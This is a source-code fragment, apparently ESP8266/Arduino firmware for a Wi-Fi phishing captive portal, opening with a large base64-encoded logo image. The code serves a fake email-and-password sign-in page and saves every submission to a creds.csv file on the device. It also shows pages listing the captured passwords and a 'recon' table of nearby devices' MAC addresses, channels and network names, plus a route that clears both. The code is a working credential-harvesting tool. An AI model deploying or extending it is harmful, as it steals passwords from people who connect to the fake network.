jowMCIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD94cGFja2V0IGVuZD0idyI/Pv/iArBJQ0NfUFJPRklMRQABAQAAAqBsY21zBDAAAG1udHJSR0IgWFlaIAfmAAgABgAAACIALGFjc3BBUFBMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD21gABAAAAANMtbGNtcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADWRlc2MAAAEgAAAAQGNwcnQAAAFgAAAANnd0cHQAAAGYAAAAFGNoYWQAAAGsAAAALHJYWVoAAAHYAAAAFGJYWVoAAAHsAAAAFGdYWVoAAAIAAAAAFHJUUkMAAAIUAAAAIGdUUkMAAAIUAAAAIGJUUkMAAAIUAAAAIGNocm0AAAI0AAAAJGRtbmQAAAJYAAAAJGRtZGQAAAJ8AAAAJG1sdWMAAAAAAAAAAQAAAAxlblVTAAAAJAAAABwARwBJAE0AUAAgAGIAdQBpAGwAdAAtAGkAbgAgAHMAUgBHAEJtbHVjAAAAAAAAAAEAAAAMZW5VUwAAABoAAAAcAFAAdQBiAGwAaQBjACAARABvAG0AYQBpAG4AAFhZWiAAAAAAAAD21gABAAAAANMtc2YzMgAAAAAAAQxCAAAF3v//8yUAAAeTAAD9kP//+6H///2iAAAD3AAAwG5YWVogAAAAAAAAb6AAADj1AAADkFhZWiAAAAAAAAAknwAAD4QAALbEWFlaIAAAAAAAAGKXAAC3hwAAGNlwYXJhA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\"><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h3>"+t+"</h3></div><div>";
  return h; }

// read credentials from csv
String creds() {
    String credHTML = header(PASS_TITLE) + "<html><body> <style>td {border: 1px solid #dddddd; text-align: left; padding: 8px 20px;} table {border-collapse: collapse; width:100%;}</style><table>";
    
    // read csv file and construct html string 
    Serial.println("Reading creds.csv database");
    File credDB = SPIFFS.open("/creds.csv", "r");
    char buffer[64];
    while (credDB.available()) {
        int l = credDB.readBytesUntil('\n', buffer, sizeof(buffer));
        buffer[l] = 0;
        
        // split username and password
        String tmpHTML = buffer;

        credHTML+="<tr>";
        credHTML+="<td>"+tmpHTML.substring(0,tmpHTML.indexOf(","))+"</td>";
        credHTML+="<td>"+tmpHTML.substring(tmpHTML.indexOf(",")+1,tmpHTML.length())+"</td>";
        credHTML+="</tr>";

    }
    credHTML+="</table></body></html><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
    credDB.close();

    return credHTML;
}

String index() {
  return header(BODY) + "<div>" + "</ol><form action=/post method=post>" +
    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String recon() {
    Serial.println();
    Serial.print("Serving recon.html ... ");
    String reconHTML = header(PASS_TITLE) + "<html><body> <style>td {border: 1px solid #dddddd; text-align: left; padding: 8px 20px;} table {border-collapse: collapse; width:100%;}</style><table>";
    
    // read csv file and construct html string 
    Serial.println("Reading recon.csv database");
    File reconDB = SPIFFS.open("/recon.csv", "r");
    char buffer[256];
    while (reconDB.available()) {
        int l = reconDB.readBytesUntil('\n', buffer, sizeof(buffer));
        buffer[l] = 0;
        
        // split username and password
        String tmpHTML = buffer;
        reconHTML+="<tr>";
        for (uint8_t i=0; i<5; i++) {
            reconHTML+="<td>"+tmpHTML.substring(0,tmpHTML.indexOf(","))+"</td>";
            tmpHTML = tmpHTML.substring(tmpHTML.indexOf(",")+1,tmpHTML.length());
        }    
        reconHTML+="</tr>";        
    }
    reconHTML+="</table></body></html><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
    reconDB.close();

    Serial.println("finished!");

    return reconHTML;
}

// process receieved credentials
String posted() {
    String email=input("email");
    String password=input("password");

    Serial.println("*****\nCredentials found:");
    Serial.println(email);
    Serial.println(password);

    /* spiffs append credentials to persistent file*/
    Serial.println("Saving credentials to file creds.csv:");
    File creds = SPIFFS.open("/creds.csv", "a");
    int bytesWritten = creds.println(email+","+password);

    if (bytesWritten > 0) {
        Serial.println("File was written");
        Serial.println(bytesWritten);
    } else {
        Serial.println("File write failed");
    }

    return header(POST_TITLE) + POST_BODY + footer();
}

// clear csv database
String clear() {
    File credDB = SPIFFS.open("/creds.csv", "w");
    credDB.println("<b>EMAIL</b>,<b>PASSWORD</b>");
    credDB.close();

    File reconDB = SPIFFS.open("/recon.csv", "w");
    reconDB.println("<b>MAC Address</b>,<b>Type</b>,<b>Channel</b>,<b>RSSI</b>,<b>Network Name</b>");
    reconDB.close();
    devCount = 0;

    return header(CLEAR_TITLE) + "<div><p>The credentials & recon list have been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}
